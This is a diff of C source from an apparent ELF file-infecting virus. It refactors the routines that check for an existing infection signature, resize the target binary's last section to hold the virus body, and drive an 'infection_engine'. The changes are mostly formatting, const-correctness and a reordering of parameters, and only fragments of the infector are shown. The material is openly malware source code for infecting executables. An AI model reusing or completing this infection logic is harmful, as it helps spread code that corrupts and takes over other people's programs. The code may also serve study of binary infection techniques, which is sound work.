@@ -1,4 +1,3 @@
-
 #include "virus.h"
 #include "utils.h"
 #include "errors.h"
@@ -7,15 +6,16 @@
 /*
 ** if current binary is already our client, don't infect again ! <3
 */
-
-static bool	not_infected(const struct entry *file_entry, struct safe_ptr file_ref, size_t dist_entry_header)
+static bool	not_infected(const struct entry *file_entry,
+			struct safe_ptr file_ref, size_t dist_entry_header)
 {
 	const Elf64_Off	sh_offset        = file_entry->safe_shdr->sh_offset;
 	const size_t	entry_offset     = sh_offset + file_entry->offset_in_section;
 	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
-	char	 	*signature       = safe(file_ref, signature_offset, SIGNATURE_LEN);
+	const char	 *signature      = safe(file_ref, signature_offset, SIGNATURE_LEN);
 
-	if (!signature) return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
+	if (signature == NULL)
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
 
 	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
 		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);
@@ -23,7 +23,7 @@ static bool	not_infected(const struct entry *file_entry, struct safe_ptr file_re
 	return true;
 }
 
-static bool	adjust_sizes(struct entry *clone_entry, \
+static bool	adjust_sizes(struct entry *clone_entry,
 			size_t shift_amount, size_t full_virus_size)
 {
 	clone_entry->safe_last_section_shdr->sh_size += full_virus_size;
@@ -61,9 +61,9 @@ static bool	define_shift_amount(const struct entry *file_entry,
 	return true;
 }
 
-bool		infection_engine(struct virus_header *vhdr, \
-			struct safe_ptr clone_ref, \
-			struct safe_ptr file_ref, size_t *shift_amount)
+bool		infection_engine(struct virus_header *vhdr,
+			struct safe_ptr file_ref, struct safe_ptr clone_ref,
+			size_t *shift_amount)
 {
 	struct entry	file_entry;
 	struct entry	clone_entry;
